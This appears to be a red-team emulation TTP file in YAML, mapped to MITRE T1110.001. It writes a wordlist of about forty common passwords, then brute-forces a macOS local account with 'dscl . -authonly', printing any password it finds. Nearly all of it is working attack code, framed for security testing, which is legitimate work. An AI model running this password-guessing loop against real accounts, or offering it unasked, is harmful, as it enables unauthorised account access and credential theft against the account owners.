---
api_version: 2.0
uuid: 23b2f9d6-5a8c-4d4f-0b3c-2e7f0a0d4c6b
name: Weak Password Dictionary Attack
authors:
- Claude Code
description: |
  Perform a dictionary attack against a macOS local account using common weak passwords.
  Creates a wordlist of frequently used passwords, then attempts authentication via
  dscl authonly for each entry and reports results.
mitre:
  tactics:
  - TA0001 Initial Access
  techniques:
  - T1110 Brute Force
  subtechniques:
  - 'T1110.001 Brute Force: Password Guessing'
requirements:
  platforms:
  - os: darwin
args:
- name: target_account
  description: Target account name for dictionary attack
  type: string
  default: $(whoami)
steps:
- name: create_wordlist
  description: Create a common password wordlist in /tmp for the dictionary attack
  inline: |
    echo "=== Creating Common Password Wordlist ==="
    cat > /tmp/ttp_dictionary_wordlist.txt << 'WORDLIST'
    password
    123456
    12345678
    qwerty
    abc123
    monkey
    1234567
    letmein
    trustno1
    dragon
    baseball
    iloveyou
    master
    sunshine
    ashley
    bailey
    shadow
    123123
    654321
    superman
    qazwsx
    michael
    football
    password1
    password123
    admin
    welcome
    hello
    charlie
    donald
    login
    starwars
    passw0rd
    master123
    apple
    macintosh
    changeme
    default
    root
    toor
    WORDLIST
    word_count=$(wc -l < /tmp/ttp_dictionary_wordlist.txt | tr -d ' ')
    echo "Wordlist created at /tmp/ttp_dictionary_wordlist.txt with $word_count entries"
- name: dictionary_attack
  description: Attempt authentication with each dictionary password against the target account
  inline: |
    echo "=== Starting Dictionary Attack Against '{{ .Args.target_account }}' ==="
    target="{{ .Args.target_account }}"
    count=0
    success=0
    while IFS= read -r password; do
      # Strip leading/trailing whitespace
      password=$(echo "$password" | xargs)
      [ -z "$password" ] && continue
      count=$((count + 1))
      result=$(dscl . -authonly "$target" "$password" 2>&1)
      if [ $? -eq 0 ]; then
        echo "CRITICAL: Password found for '$target': $password"
        success=1
        break
      fi
      [ $((count % 10)) -eq 0 ] && echo "Progress: tested $count passwords..."
    done < /tmp/ttp_dictionary_wordlist.txt
    echo "=== Dictionary Attack Complete ==="
    echo "Total passwords tested: $count"
    if [ "$success" -eq 0 ]; then
      echo "Result: No matching password found in dictionary"
    else
      echo "Result: Weak password discovered"
    fi
  cleanup:
    inline: |
      echo "Removing temporary wordlist"
      rm -f /tmp/ttp_dictionary_wordlist.txt
tests:
- name: dry_run_test
  dry_run: true
